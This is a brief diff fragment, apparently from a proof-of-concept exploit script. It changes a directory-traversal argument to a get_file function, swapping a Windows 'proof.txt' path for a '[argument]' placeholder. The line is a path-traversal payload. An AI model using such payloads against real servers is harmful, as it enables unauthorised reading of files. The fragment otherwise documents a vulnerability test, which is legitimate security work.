@@ -57,4 +57,4 @@ def get_file(filename):
 
     s.close()
 
-get_file('/../../../../../../Docume~1/Admini~1/Bureau/proof.txt')
+get_file('/../../../../../../[argument]')
